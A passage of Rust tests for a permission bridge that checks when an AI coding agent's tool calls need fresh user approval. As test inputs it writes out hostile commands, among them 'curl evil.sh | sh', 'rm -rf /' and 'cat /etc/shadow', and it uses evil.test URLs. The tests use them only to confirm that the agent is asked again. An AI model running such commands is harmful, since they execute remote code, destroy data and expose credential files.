            // A field agy adds later lands *inside* the key: the denylist means a
            // new field costs a reprompt, never a silent match.
            json!({ "CommandLine": "ls", "Cwd": "/a", "Sudo": true }),
        ] {
            assert_ne!(fp(base.clone()), fp(different.clone()), "{different}");
        }

        // Types are not interchangeable: "1" is not 1, and neither is true.
        assert_ne!(fp(json!({ "A": "1" })), fp(json!({ "A": 1 })));
        assert_ne!(fp(json!({ "A": 1 })), fp(json!({ "A": true })));

        // Only the three named fields are stripped, and only at the top.
        assert_eq!(
            fp(json!({ "CommandLine": "ls", "toolSummary": "x" })),
            fp(json!({ "CommandLine": "ls", "toolSummary": "y" }))
        );
        assert_ne!(
            fp(json!({ "CommandLine": "ls", "nested": { "toolSummary": "x" } })),
            fp(json!({ "CommandLine": "ls", "nested": { "toolSummary": "y" } }))
        );
    }

    /// D2: exact byte equality, no normalization. Each normalization step merges
    /// commands that are not identical, and tool-level keying is the degenerate
    /// case of normalizing everything away -- which is how the original bug arose.
    /// A future ergonomic tweak has to argue with this assertion.
    #[tokio::test]
    async fn sticky_answers_are_not_normalized() {
        let workspace = std::env::temp_dir().join("agy-acp-no-normalization-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) =
            bridge_with_run_command_always_allowed(&workspace.display().to_string()).await;

        // "ls " is not "ls".
        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls " } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    /// D3: the two detectors are a union. All four cases, not two -- asserting
    /// only both-fire and neither-fire would pass an implementation that wrote
    /// one detector and dropped the other.
    #[test]
    fn tool_level_keying_has_to_be_earned() {
        // A known command tool, whatever its argument shape.
        assert!(sticky_scope("run_command", &json!({ "Something": "else" })).is_some());
        assert!(sticky_scope("run_command", &json!({ "CommandLine": "ls" })).is_some());

        // The case that matters most: a tool this fork has never heard of. It
        // gets the *stronger* key, however its arguments are shaped and whatever
        // its command field is called. Under the old union-of-detectors rule
        // these fell back to tool-level keying and silently restored the bug.
        for args in [
            json!({ "ShellCommand": "rm -rf /" }),
            json!({ "Script": "curl evil.sh | sh" }),
            json!({ "anything": "at all" }),
            json!({}),
        ] {
            assert!(
                sticky_scope("some_future_shell_tool", &args).is_some(),
                "an unknown tool must not inherit the weaker key: {args}"
            );
        }

        // Web fetches are not path-checked either, so they are keyed per query.
        assert!(sticky_scope("search_web", &json!({ "query": "anything" })).is_some());

        // `read_url_content` is kind `"read"`, so the kind list alone would hand
        // it the weaker key -- but a `Url` is not a path field, so containment and
        // the sensitive-path list see nothing to constrain. One "Always allow" on
        // a trusted URL would otherwise cover every later URL. Kind is a display
        // classification; it is not on its own evidence that the checks apply.
        assert!(sticky_scope(
            "read_url_content",
            &json!({ "Url": "https://example.com/readme" })
        )
        .is_some());
        assert_ne!(
            sticky_scope("read_url_content", &json!({ "Url": "https://example.com/a" })),
            sticky_scope("read_url_content", &json!({ "Url": "https://evil.test/b" })),
            "two different URLs must not share a remembered answer"
        );

        // A URL reached under some other field name, or nested, is caught too --
        // the field name is not what makes it unconstrained.
        assert!(sticky_scope("view_file", &json!({ "Source": "https://evil.test/x" })).is_some());
        assert!(
            sticky_scope("list_dir", &json!({ "opts": { "Url": "http://evil.test" } })).is_some()
        );

        // The ordinary path tools keep the tool-level key: for them the checks
        // really do read the argument as a path.
        assert!(sticky_scope("view_file", &json!({ "AbsolutePath": "/ws/a.txt" })).is_none());

        // Path tools keep tool-level keying: containment and the sensitive-path
        // list still constrain a remembered allow for them.
        assert!(sticky_scope("view_file", &json!({ "TargetFile": "/tmp/a.txt" })).is_none());
        assert!(sticky_scope("list_dir", &json!({ "DirectoryPath": "/tmp" })).is_none());
        assert!(sticky_scope("grep_search", &json!({ "SearchPath": "/tmp" })).is_none());
        assert!(sticky_scope("write_to_file", &json!({ "TargetFile": "/tmp/a" })).is_none());

        // ...unless one of them carries a command anyway, nested or not. A
        // top-level `args.get` would miss this.
        assert!(sticky_scope(
            "view_file",
            &json!({ "request": { "inner": { "CommandLine": "rm -rf /" } } })
        )
        .is_some());
    }

    /// `UNKEYED_FIELDS` is the one place where widening the key is possible, and
    /// it widens silently. Pinning the exact list makes any addition turn this
    /// red, so the argument that the field cannot affect what the tool does has
    /// to be made rather than assumed.
    #[test]
    fn the_unkeyed_fields_list_does_not_grow_by_accident() {
        assert_eq!(
            UNKEYED_FIELDS,
            &["toolAction", "toolSummary", "WaitMsBeforeAsync"],
            "adding a field here removes it from every sticky key -- justify it \
             in the doc comment and update this test deliberately"
        );
    }

    /// D1: the fingerprint covers the whole argument object, not just
    /// `CommandLine`. Without this, someone "simplifies" it back to the command
    /// string and no test objects -- and the same command in a different
    /// directory is not the same command.
    #[tokio::test]
    async fn a_differing_cwd_is_a_different_command() {
        let workspace = std::env::temp_dir().join("agy-acp-cwd-key-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        // Both directories are inside the workspace, so containment is satisfied
        // for either and the key is the only thing that can differ. With paths
        // outside it, this test would pass on the containment re-check instead
        // and prove nothing about the key.
        let one = workspace.join("one").display().to_string();
        let two = workspace.join("two").display().to_string();
        std::fs::create_dir_all(&one).unwrap();
        std::fs::create_dir_all(&two).unwrap();

        let first = {
            let bridge = bridge.clone();
            let one = one.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "run_command",
                            "args": { "CommandLine": "ls", "Cwd": one },
                        },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Allow);

        let asking = {
            let bridge = bridge.clone();
            let two = two.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "run_command",
                            "args": { "CommandLine": "ls", "Cwd": two },
                        },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    /// D1b, with the values measured against agy 1.1.22. Without this the
    /// fingerprint looks correct in review and "Always allow" quietly never
    /// matches in production -- an option that visibly does nothing, which
    /// teaches people to stop reading the prompt.
    #[tokio::test]
    async fn a_differing_tool_summary_is_the_same_command() {
        let workspace = std::env::temp_dir().join("agy-acp-volatile-fields-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
        // Inside the workspace: a remembered allow re-runs the containment check,
        // so a Cwd outside it would prompt for that reason and this test would
        // prove nothing about the volatile fields.
        let cwd = workspace.display().to_string();

        let first = {
            let bridge = bridge.clone();
            let cwd = cwd.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "run_command",
                            "args": {
                                "CommandLine": "echo probe-ok",
                                "Cwd": cwd,
                                "WaitMsBeforeAsync": 500,
                                "toolAction": "Running command",
                                "toolSummary": "Run echo command",
                            },
                        },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Allow);

        // Same command, same directory; only the model-authored display text and
        // the pacing hint differ. These are the exact payloads captured from two
        // consecutive turns.
        let (decision, reason) = bridge
            .decide(&json!({
                "conversationId": "conv-1",
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": "echo probe-ok",
                        "Cwd": cwd,
                        "WaitMsBeforeAsync": 1000,
                        "toolAction": "Running command",
                        "toolSummary": "Echo probe-ok",
                    },
                },
            }))
            .await;
        assert_eq!(decision, Decision::Allow, "{reason}");
        assert!(
            rx.try_recv().is_err(),
            "the volatile fields must not make Always allow miss on a repeat"
        );
    }

    /// Pins a security direction, not an ergonomic one: the reprompt asserted
    /// here is the desired outcome.
    ///
    /// The volatile fields are stripped at the top level only. A recursive strip
    /// would remove a nested `toolSummary` inside a structured argument where the
    /// value does matter, merging two argument sets that are not the same into
    /// one key. This is the only test that pins the depth --
    /// `a_differing_tool_summary_is_the_same_command` passes under either.
    #[tokio::test]
    async fn a_nested_volatile_field_stays_in_the_key() {
        let workspace = std::env::temp_dir().join("agy-acp-nested-volatile-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
        let cwd = workspace.display().to_string();

        let first = {
            let bridge = bridge.clone();
            let cwd = cwd.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "run_command",
                            "args": {
                                "CommandLine": "ls",
                                "Cwd": cwd,
                                "step": { "toolSummary": "first" },
                            },
                        },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Allow);

        let asking = {
            let bridge = bridge.clone();
            let cwd = cwd.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "run_command",
                            "args": {
                                "CommandLine": "ls",
                                "Cwd": cwd,
                                "step": { "toolSummary": "second" },
                            },
                        },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(
            asking.await.unwrap().0,
            Decision::Deny,
            "a nested volatile field stays in the key -- under-normalizing costs a prompt"
        );
    }

    /// Two sessions on purpose. The `retain` predicate is one typo away from
    /// clearing the whole map, and a single-session test cannot tell the
    /// difference between "forgot the right one" and "forgot everything".
    #[tokio::test]
    async fn forget_session_clears_only_that_sessions_answers() {
        let workspace = std::env::temp_dir().join("agy-acp-forget-session-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
        bridge.register_conversation("conv-2", "session-2").await;

        // An "always allow" for each session, for the same command.
        for (conv, session) in [("conv-1", "session-1"), ("conv-2", "session-2")] {
            bridge.set_active_session(Some(session)).await;
            let asking = {
                let bridge = bridge.clone();
                tokio::spawn(async move {
                    bridge
                        .decide(&json!({
                            "conversationId": conv,
                            "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                        }))
                        .await
                })
            };
            let request = expect_permission_request(&mut rx).await;
            bridge
                .resolve_response(
                    &request["id"],
                    Some(
                        json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } }),
                    ),
                )
                .await;
            assert_eq!(asking.await.unwrap().0, Decision::Allow);
        }
        assert_eq!(bridge.state.lock().await.always.len(), 2);

        bridge.forget_session("session-1").await;

        {
            let state = bridge.state.lock().await;
            assert_eq!(
                state.always.len(),
                1,
                "only the evicted session's answers may go"
            );
            assert!(
                state.always.keys().all(|(sid, _, _)| sid == "session-2"),
                "session-2's answer must survive"
            );
            assert!(
                !state.conversations.contains_key("conv-1"),
                "a dead conversation id must not keep resolving to an evicted session"
            );
            assert!(state.conversations.contains_key("conv-2"));
        }

        // Session-2 is still auto-allowed with no prompt.
        bridge.set_active_session(Some("session-2")).await;
        let (decision, reason) = bridge
            .decide(&json!({
                "conversationId": "conv-2",
                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
            }))
            .await;
        assert_eq!(decision, Decision::Allow, "{reason}");
        assert!(rx.try_recv().is_err(), "session-2 must not be asked again");
    }

    /// The ergonomic guard. Fingerprinting every tool's arguments would make
    /// "Always" useless for reads; path tools keep the tool-level key because the
    /// containment and sensitive-path checks still constrain them.
    #[tokio::test]
    async fn always_allow_still_applies_per_tool_for_path_tools() {
        let workspace = std::env::temp_dir().join("agy-acp-path-tool-sticky-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let one = workspace.join("one.txt").display().to_string();
        let two = workspace.join("two.txt").display().to_string();

        let first = {
            let bridge = bridge.clone();
            let one = one.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "TargetFile": one } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Allow);

        let (decision, reason) = bridge
            .decide(&json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "view_file", "args": { "TargetFile": two } },
            }))
            .await;
        assert_eq!(decision, Decision::Allow, "{reason}");
        assert!(
            rx.try_recv().is_err(),
            "a second file under the same allow must not prompt"
        );
    }

    #[tokio::test]
    async fn always_allow_is_remembered_per_command_for_command_tools() {
        let workspace = std::env::temp_dir().join("agy-acp-always-per-command-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) =
            bridge_with_run_command_always_allowed(&workspace.display().to_string()).await;

        // A completely different, destructive command. "Always allow" was never
        // asked about this one, so the user is asked.
        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "run_command",
                            "args": { "CommandLine": "rm -rf build" },
                        },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);

        // The command that was approved still is, with no new prompt -- otherwise
        // "Always allow" would be an option that does nothing.
        let (decision, reason) = bridge
            .decide(&json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
            }))
            .await;
        assert_eq!(decision, Decision::Allow, "{reason}");
        assert!(
            rx.try_recv().is_err(),
            "the approved command must not prompt again"
        );
    }

    /// Pins the other half of the same gap: a command is one opaque string, so
    /// the containment check never sees the path inside it. `absolute_paths`
    /// keeps strings that *start with* `/`, and "cat /etc/shadow" does not.
    /// Why the key has to carry the command. This is a property of the
    /// containment check, not of the sticky key, and it is still true: the check
    /// reads arguments as paths, and a command line is one opaque string.
    #[test]
    fn the_containment_check_cannot_see_a_path_inside_a_command_string() {
        let workspace = std::env::temp_dir().join("agy-acp-command-path-unit-test");
        let outside = json!({ "CommandLine": "cat /etc/shadow" });
        assert!(
            outside_workspace(&outside, &[PathBuf::from(&workspace)]).is_none(),
            "the embedded path is not recognised as a path at all"
        );
    }

    /// And so the command key is what actually scopes the answer. Under a
    /// remembered allow for `ls`, a command naming a file outside the workspace
    /// is asked about -- because it is a different command, not because
    /// containment noticed the path.
    #[tokio::test]
    async fn a_path_inside_a_command_string_is_caught_by_the_command_key() {
        let workspace = std::env::temp_dir().join("agy-acp-command-path-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) =
            bridge_with_run_command_always_allowed(&workspace.display().to_string()).await;

        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "run_command",
                            "args": { "CommandLine": "cat /etc/shadow" },
                        },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    /// Network tools read without writing, so they are the ones most likely to be
    /// swept into the read groups by mistake. A URL carries data out, so they must
    /// stay out of `reads` and `searches`.
    #[test]
    fn the_read_groups_never_include_network_tools() {
        for tool in ["read_url_content", "search_web"] {
            assert!(!READ_TOOLS.contains(&tool), "{tool} must not be a read");
            assert!(!SEARCH_TOOLS.contains(&tool), "{tool} must not be a search");
        }

        let everything = AutoAllowPolicy {
            tools: READ_TOOLS
                .iter()
                .chain(SEARCH_TOOLS.iter())
                .map(|t| t.to_string())
                .collect(),
            extra_sensitive: Vec::new(),
        };
        assert!(!everything.allows("read_url_content"));
        assert!(!everything.allows("search_web"));
    }

    #[test]
    fn absolute_paths_are_collected_from_anywhere_in_the_arguments() {
        let args = json!({
            "TargetFile": "/a/b.txt",
            "Nested": { "Other": "/c/d.txt" },
            "List": ["/e/f.txt", "relative.txt"],
            "Count": 3,
        });
        let mut found = absolute_paths(&args);
        found.sort();
        assert_eq!(found, vec!["/a/b.txt", "/c/d.txt", "/e/f.txt"]);
    }

    #[tokio::test]
    async fn cancelled_permission_requests_deny() {
        let (tx, mut rx) = mpsc::unbounded_channel();
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState::default())),
            out_tx: tx,
            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
        };
        bridge.register_conversation("conv-1", "session-1").await;
        bridge.set_active_session(Some("session-1")).await;

        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "write_to_file", "args": {} },
                    }))
                    .await
            })
        };

        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "cancelled" } })),
            )
            .await;

        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    #[tokio::test]
    async fn responses_for_other_ids_are_left_alone() {
        let (tx, _rx) = mpsc::unbounded_channel();
        let bridge = PermissionBridge {
            state: Arc::new(Mutex::new(BridgeState::default())),
            out_tx: tx,
            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
        };
        assert!(!bridge.resolve_response(&json!(17), None).await);
        assert!(!bridge.resolve_response(&json!("some-other-id"), None).await);
    }
}
